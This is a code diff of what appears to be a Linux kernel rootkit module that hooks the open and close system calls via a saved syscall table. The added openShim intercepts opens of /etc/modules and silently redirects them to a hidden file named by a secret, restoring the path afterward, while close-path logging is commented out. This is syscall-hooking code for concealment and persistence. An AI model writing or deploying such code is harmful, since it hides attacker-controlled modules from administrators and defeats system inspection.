@@ -11,19 +11,22 @@
 #include "secrets.h"
 MODULE_LICENSE("GPL");
 
-int openShim(const char *filename, int flags, umode_t mode) {
-	printk(KERN_INFO "openShim %s\n", filename);
-	if (filename[0] == '/' && filename[1] == 'e' && filename[2] == 't' && filename[3] == 'c' && filename[4] == '/' && filename[5] == 'm' && filename[6] == 'o') {
-		printk(KERN_INFO "openShim ETC MODULES DETECTED\n");
+int openShim(char *filename, int flags, umode_t mode) {
+	int ret;
+	if (!strcmp(filename, "/etc/modules")) {
+		strcpy(filename, secret_modules_name);
+		printk(KERN_INFO "Redirecting /etc/modules open\n");
+		ret = ((SYS_open_type)backup_sys_call_table[SYS_open])(filename, flags, mode);
+		strcpy(filename, "/etc/modules");
+		return ret;
 	}
 	return ((SYS_open_type)backup_sys_call_table[SYS_open])(filename, flags, mode);
 }
 
 int closeShim(unsigned int fd) {
-	char* path = kmalloc(256, GFP_KERNEL);
-	path[255] = '\0';
-	get_path_via_fd(fd, path, 256);
-	printk(KERN_INFO "closeShim %s\n", path);
-	kfree(path);
+	//char* path = kmalloc(256, GFP_KERNEL);
+	//path[255] = '\0';
+	//get_path_via_fd(fd, path, 256);
+	//kfree(path);
 	return ((SYS_close_type)backup_sys_call_table[SYS_close])(fd);
 }
